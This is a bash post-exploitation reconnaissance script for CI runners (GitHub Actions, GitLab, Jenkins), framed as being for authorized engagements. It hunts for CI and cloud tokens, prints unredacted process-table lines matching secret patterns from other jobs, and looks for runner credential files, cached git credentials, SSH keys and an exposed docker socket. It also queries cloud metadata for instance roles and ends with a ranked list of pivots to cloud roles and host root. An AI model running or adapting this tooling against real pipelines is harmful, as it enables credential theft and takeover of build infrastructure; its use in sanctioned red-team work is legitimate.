#!/usr/bin/env bash
#
# runner_recon.sh - Recon a CI runner you have code-exec on (authorized engagement only).
#
# Enumerates the data that turns a runner foothold into a pivot:
#   - runner type (GitHub-hosted ephemeral vs self-hosted persistent) and config files
#   - GitHub Actions / GitLab / Jenkins environment (tokens, OIDC mint URL, secret-bearing vars)
#   - secrets leaked into the process table by *other* concurrent jobs (ps -ww)
#   - mounted docker socket (host takeover) and cloud IMDS reachability
#   - cached VCS credentials (.git-credentials / .netrc) and SSH keys
#   - outbound egress reachability (what can be exfil'd / what C2 is reachable)
#
# It is READ-ONLY: it prints findings, it does not modify the host or exfiltrate anything.
#
# Usage:   bash runner_recon.sh            # human-readable
#          bash runner_recon.sh --quiet    # only the [FOUND]/[WARN] lines
#
# Deps: coreutils, ps, curl (optional). Works on Linux/macOS runners (bash).

set -u
QUIET="${1:-}"
sect() { [ "$QUIET" = "--quiet" ] || printf '\n=== %s ===\n' "$1"; }
found() { printf '[FOUND] %s\n' "$1"; }
warn()  { printf '[WARN ] %s\n' "$1"; }
info()  { [ "$QUIET" = "--quiet" ] || printf '        %s\n' "$1"; }

sect "Runner identity & type"
info "host=$(hostname 2>/dev/null) user=$(id -un 2>/dev/null) uid=$(id -u 2>/dev/null)"
if [ -n "${RUNNER_NAME:-}" ] || [ -n "${GITHUB_ACTIONS:-}" ]; then
  found "GitHub Actions runner: name=${RUNNER_NAME:-?} os=${RUNNER_OS:-?} workspace=${GITHUB_WORKSPACE:-?}"
  [ "${RUNNER_ENVIRONMENT:-}" = "self-hosted" ] && warn "SELF-HOSTED runner (non-ephemeral risk: persistence + cross-job secret leak)"
  [ "${RUNNER_ENVIRONMENT:-}" = "github-hosted" ] && info "github-hosted (ephemeral; no persistence between jobs)"
fi
[ -n "${CI_RUNNER_ID:-}" ] && found "GitLab runner: id=${CI_RUNNER_ID} tags=${CI_RUNNER_TAGS:-?} project=${CI_PROJECT_PATH:-?}"
[ -n "${JENKINS_URL:-}" ]  && found "Jenkins agent: ${JENKINS_URL} job=${JOB_NAME:-?} node=${NODE_NAME:-?}"

# self-hosted runner config files (often contain the registration token / agent settings)
for d in "${RUNNER_DIR:-$HOME/actions-runner}" "$HOME/actions-runner" /actions-runner ./_work/../; do
  for f in "$d/.runner" "$d/.credentials"; do
    [ -f "$f" ] && warn "self-hosted runner config readable: $f"
  done
done

sect "CI tokens / secret-bearing environment"
for v in GITHUB_TOKEN ACTIONS_RUNTIME_TOKEN ACTIONS_ID_TOKEN_REQUEST_URL ACTIONS_ID_TOKEN_REQUEST_TOKEN \
         CI_JOB_TOKEN CI_REGISTRY_PASSWORD CI_DEPLOY_PASSWORD NPM_TOKEN PYPI_TOKEN \
         AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN GOOGLE_APPLICATION_CREDENTIALS \
         AZURE_CLIENT_SECRET DOCKER_PASSWORD GH_TOKEN; do
  if [ -n "$(eval "echo \${$v:-}")" ]; then found "env present: \$$v (value redacted)"; fi
done
[ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && warn "OIDC mint available: can request a cloud JWT (see secrets-oidc-abuse.md)"
# any other env containing secret-like substrings
env 2>/dev/null | grep -iE '(_token|_secret|_password|apikey|api_key)=' | sed 's/=.*/=<redacted>/' \
  | while read -r line; do info "env secret-like: $line"; done

sect "Cross-job secret leak via process table (concurrent-job runner)"
ps -ww -eo pid,user,args 2>/dev/null | grep -iE -- '--?(password|token|secret)|AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{20,}|gho_|glpat-' \
  | grep -v grep | while read -r l; do warn "secret in process args: $l"; done

sect "Docker socket / host takeover"
for s in /var/run/docker.sock /run/docker.sock; do
  if [ -S "$s" ]; then warn "docker socket exposed: $s (container->host takeover possible)"; fi
done

sect "Cloud instance metadata (IMDS) reachability"
if command -v curl >/dev/null 2>&1; then
  # AWS IMDSv2
  TOK=$(curl -s -m 2 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)
  if [ -n "$TOK" ]; then
    ROLE=$(curl -s -m 2 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
    [ -n "$ROLE" ] && warn "AWS IMDS reachable; instance role: $ROLE"
  fi
  curl -s -m 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/ >/dev/null 2>&1 \
    && warn "GCP metadata reachable (service-account tokens available)"
fi

sect "Cached VCS credentials & SSH keys"
for f in "$HOME/.git-credentials" "$HOME/.netrc" "$GITHUB_WORKSPACE/../.git-credentials"; do
  [ -f "$f" ] && warn "VCS credential cache readable: $f"
done
[ -d "$HOME/.ssh" ] && ls "$HOME/.ssh"/id_* 2>/dev/null | while read -r k; do warn "SSH private key: $k"; done

sect "Egress reachability (exfil / C2 surface)"
if command -v curl >/dev/null 2>&1; then
  for h in https://api.github.com https://example.com; do
    code=$(curl -s -o /dev/null -m 3 -w '%{http_code}' "$h" 2>/dev/null)
    info "reach $h -> HTTP ${code:-timeout}"
  done
  info "(harden-runner / egress allowlist would block non-github.com here)"
fi

sect "Summary"
info "Pivot priorities: 1) self-hosted+concurrent => harvest process-table secrets;"
info "                  2) OIDC mint => assume cloud role (no stored key);"
info "                  3) docker.sock => host root;  4) IMDS role => cloud creds."
